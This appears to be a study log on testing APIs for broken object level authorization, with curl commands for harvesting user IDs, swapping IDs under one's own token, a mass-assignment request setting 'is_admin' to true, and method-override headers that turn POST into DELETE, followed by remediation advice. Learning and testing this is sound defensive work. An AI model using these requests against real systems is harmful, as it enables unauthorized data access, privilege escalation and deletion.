# 🎯 Day 3: Broken Object Level Authorization (BOLA) & Privilege Escalation
**Focus:** Testing the "Authorization" layer. Once a user is logged in, can they access or modify data that does not belong to them?

---

## 📘 Theory: Authentication vs. Authorization
* **Authentication:** Handled by the JWT/Session Token (Who are you?).
* **Authorization:** The server's logic to check if you own the resource (What can you do?).
* **BOLA:** The #1 API vulnerability. It occurs when the server trusts the ID provided in the request without verifying ownership.



---

## 🕵️‍♂️ Phase 1: The "Hunting" Methodology
I identify where the API uses **Object Identifiers**:
1. **URL Path:** `/api/v1/users/101/profile`
2. **Query Parameters:** `/api/v1/download?file_id=999`
3. **JSON Body:** `{"order_id": "ORD-44"}`

---

## 🧪 Phase 2: The Investigation Steps

### Step 1 — ID Harvesting (Finding Targets)
Using terminal commands to find leaked UUIDs from public endpoints.
```bash
# Extracting UUIDs from a public search result
curl -s "https://api.site.com/v1/public/users" | grep -E -o "[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}"
Step 2 — The BOLA Swap (Testing Access)
Using Burp Suite Repeater to replace my ID with a Target ID while keeping my valid token.

Bash

curl -X GET "https://api.site.com/v1/messages/TARGET_ID" \
-H "Authorization: Bearer <MY_VALID_TOKEN>"
Step 3 — Mass Assignment (Privilege Escalation)
Investigating if the API allows updating "hidden" administrative fields like is_admin.

Bash

curl -X PATCH "https://api.site.com/v1/user/update" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer <TOKEN>" \
-d '{"username": "test_user", "is_admin": true, "role": "admin"}'
🛠️ Phase 3: Advanced Method & Parameter Overriding
Testing if the API Gateway can be bypassed by "wrapping" a forbidden method inside a permitted one.

1️⃣ Method Override Headers
Bash

# Gateway allows POST, but Backend executes DELETE
curl -X POST https://api.site.com/v1/user/101 \
-H "X-HTTP-Method-Override: DELETE" \
-H "Authorization: Bearer <TOKEN>"
2️⃣ Parameter & JSON Overrides
URL Parameter: POST /v1/user/101?_method=DELETE

JSON Body: {"method": "DELETE", "id": 101}

🛡️ Remediation Strategy
Ownership Check: Implement if (resource.owner_id != current_user.id) return 403;.

UUIDs: Use non-guessable identifiers to make harvesting harder.

Whitelist Input: Use strict schemas to prevent Mass Assignment.
